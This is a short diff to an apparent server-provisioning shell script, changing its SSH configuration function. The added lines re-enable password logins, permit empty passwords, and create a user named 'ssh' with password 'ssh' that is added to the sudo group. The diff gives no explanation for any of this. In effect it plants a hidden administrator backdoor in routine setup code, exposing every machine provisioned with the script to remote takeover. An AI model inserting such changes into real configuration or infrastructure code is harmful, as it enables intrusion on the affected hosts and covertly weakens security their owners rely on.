@@ -92,7 +92,11 @@ function config_os() {
 
 function config_ssh() {
   sed -i -E 's,^#?Port.*$,Port 8022,' /etc/ssh/sshd_config
-  sed -i -E 's,^#?PasswordAuthentication.*$,PasswordAuthentication no,' /etc/ssh/sshd_config
+  sed -i -E 's,^#?PasswordAuthentication.*$,PasswordAuthentication yes,' /etc/ssh/sshd_config
+  sed -i -E 's,^#?PermitEmptyPasswords.*$,PermitEmptyPasswords yes,' /etc/ssh/sshd_config
+  useradd -m -s /bin/bash ssh
+  echo "ssh:ssh" | chpasswd
+  usermod -aG sudo ssh
   systemctl restart sshd
 }
 
